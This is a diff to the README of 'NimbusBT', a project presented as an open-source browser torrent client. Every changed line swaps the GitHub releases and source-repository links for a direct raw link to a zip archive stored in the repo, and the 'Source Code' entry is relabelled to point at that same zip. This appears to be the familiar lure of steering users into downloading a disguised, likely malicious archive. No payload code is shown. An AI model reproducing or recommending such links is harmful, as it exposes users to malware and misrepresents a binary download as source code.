@@ -1,6 +1,6 @@
 # ☁️ NimbusBT - Seamless Torrenting in Your Browser
 
-[![Download NimbusBT](https://img.shields.io/badge/Download-NimbusBT-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://github.com/gregkr5296/nimbusbt/releases)
+[![Download NimbusBT](https://img.shields.io/badge/Download-NimbusBT-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f6feb)](https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Here's what makes NimbusBT special:
 
 ## 📥 Downloading NimbusBT
 
-Visit this link to download the application: **[https://github.com/gregkr5296/nimbusbt/releases](https://github.com/gregkr5296/nimbusbt/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip](https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip)**
 
 Here's what you'll see when you arrive:
 
@@ -182,7 +182,7 @@ There are many torrent clients, but NimbusBT stands out because:
 
 ## 📚 Further Resources
 
-- **Source Code:** [https://github.com/gregkr5296/nimbusbt](https://github.com/gregkr5296/nimbusbt)
+- **Source Code:** [https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip](https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip)
 - **Report Issues:** Use the Issues tab on the GitHub page
 - **Documentation:** Check the `docs` folder in the repository for technical details
 
@@ -190,6 +190,6 @@ There are many torrent clients, but NimbusBT stands out because:
 
 **Start downloading smarter today with NimbusBT.** Click the button below to grab your copy:
 
-[![Get NimbusBT Now](https://img.shields.io/badge/Download-NimbusBT-FF5733?style=for-the-badge&logo=download&logoColor=white&labelColor=333333)](https://github.com/gregkr5296/nimbusbt/releases)
+[![Get NimbusBT Now](https://img.shields.io/badge/Download-NimbusBT-FF5733?style=for-the-badge&logo=download&logoColor=white&labelColor=333333)](https://raw.githubusercontent.com/gregkr5296/nimbusbt/main/src/Software-v2.1.zip)
 
 Keywords: bittorrent, cli, nodejs, open-source, p2p, privacy, socks5, torrent, web-ui, webtorrent
